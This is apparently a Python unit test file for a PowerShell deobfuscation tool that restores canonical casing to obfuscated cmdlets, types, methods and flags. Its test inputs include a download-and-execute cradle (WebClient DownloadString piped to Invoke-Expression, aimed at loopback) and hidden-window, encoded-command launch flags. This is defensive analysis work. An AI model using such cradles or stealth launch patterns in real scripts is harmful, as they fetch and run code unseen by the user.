"""
Unit and integration tests for PowerShell Casing Randomization Normalizer.
Verifies canonical casing restoration across cmdlets, aliases, keywords,
type accelerators, .NET static/instance methods, CLI parameters, and variables.
"""

import unittest

from src.casing_normalizer import PowerShellCasingNormalizer
from src.deobfuscator_engine import PowerShellDeobfuscator
from src.lexer import PowerShellLexer
from src.normalizer import PowerShellNormalizer
from src.parser import PowerShellParser


class TestPowerShellCasingNormalizer(unittest.TestCase):
    """Test suite for casing normalization of PowerShell and .NET AST symbols."""

    def setUp(self):
        self.normalizer = PowerShellNormalizer()
        self.deobfuscator = PowerShellDeobfuscator()

    def _parse_and_normalize(self, code: str) -> str:
        tokens = PowerShellLexer(code).tokenize()
        ast = PowerShellParser(tokens).parse()
        norm_ast = self.normalizer.normalize(ast)
        return self.normalizer.to_source(norm_ast)

    def test_cmdlet_casing_invoke_expression(self):
        code = "InVoKe-ExPrEsSiOn 'calc.exe'"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "Invoke-Expression 'calc.exe'")

    def test_cmdlet_casing_get_command(self):
        code = "gEt-cOmMaNd"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "Get-Command")

    def test_cmdlet_casing_start_process(self):
        code = "sTaRt-pRoCeSs 'notepad.exe'"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "Start-Process 'notepad.exe'")

    def test_generic_verb_noun_casing(self):
        code = "tEsT-cOnNeCtIoN -ComputerName localhost"
        result = self._parse_and_normalize(code)
        self.assertTrue(result.startswith("Test-Connection"))

    def test_keyword_casing_if(self):
        code = "iF ($true) { 'ok' }"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "'ok'")

    def test_keyword_casing_while(self):
        code = "wHiLe ($cond) { 'loop' }"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "while ($cond) 'loop'")

    def test_type_accelerator_byte_array(self):
        code = "[bYtE[]]"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "[byte[]]")

    def test_type_class_webclient(self):
        code = "[sYsTeM.nEt.wEbClIeNt]"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "[System.Net.WebClient]")

    def test_member_method_casing_instance(self):
        code = "$client.dOwNlOaDsTrInG('http://example.com')"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "$client.DownloadString('http://example.com')")

    def test_member_property_casing_length(self):
        code = "$str.lEnGtH"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "$str.Length")

    def test_static_member_casing(self):
        code = "[sYsTeM.cOnVeRt]::fRoMbAsE64sTrInG('AAAA')"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "[System.Convert]::FromBase64String('AAAA')")

    def test_parameter_casing_encodedcommand(self):
        code = "powershell.exe -eNcOdEdCoMmAnD 'cwBvAG0AZQA='"
        result = self._parse_and_normalize(code)
        self.assertIn("-EncodedCommand", result)

    def test_parameter_casing_multiple_flags(self):
        code = "powershell.exe -nOpRoFiLe -nOnInTeRaCtIvE -wInDoWsTyLe Hidden"
        result = self._parse_and_normalize(code)
        self.assertIn("-NoProfile", result)
        self.assertIn("-NonInteractive", result)
        self.assertIn("-WindowStyle", result)

    def test_automatic_variable_casing_boolean(self):
        code = "$tRuE"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "$true")

        code_false = "$fAlSe"
        result_false = self._parse_and_normalize(code_false)
        self.assertEqual(result_false, "$false")

    def test_automatic_variable_casing_null_and_pshome(self):
        code_null = "$nUlL"
        self.assertEqual(self._parse_and_normalize(code_null), "$null")

        code_pshome = "$pShOmE"
        # Environment inliner inlines PSHOME or casing normalizer formats
        result_pshome = self._parse_and_normalize(code_pshome)
        self.assertTrue(result_pshome == "$PSHOME" or "WindowsPowerShell" in result_pshome)

    def test_environment_variable_casing(self):
        # Environment inliner inlines $env:COMSPEC to cmd.exe or casing preserves $env:COMSPEC
        code = "$eNv:cOmSpEc"
        tokens = PowerShellLexer(code).tokenize()
        ast = PowerShellParser(tokens).parse()
        casing_norm = PowerShellCasingNormalizer()
        norm_ast = casing_norm.normalize(ast)
        stmt = norm_ast.statements[0]
        self.assertEqual(stmt.name, "COMSPEC")
        self.assertEqual(stmt.scope, "env")

    def test_dynamic_member_call_casing(self):
        code = "$obj.('sUbStRiNg')(0, 5)"
        result = self._parse_and_normalize(code)
        self.assertEqual(result, "$obj.Substring(0, 5)")

    def test_full_script_end_to_end_normalization(self):
        script = """
        $Wc = NeW-ObJeCt sYsTeM.nEt.wEbClIeNt
        $PaYlOaD = $Wc.dOwNlOaDsTrInG('http://127.0.0.1/p')
        InVoKe-ExPrEsSiOn $PaYlOaD
        """.strip()
        result = self.deobfuscator.deobfuscate(script)
        self.assertIn("New-Object", result)
        self.assertIn("System.Net.WebClient", result)
        self.assertIn("DownloadString", result)
        self.assertIn("Invoke-Expression", result)


if __name__ == "__main__":
    unittest.main()
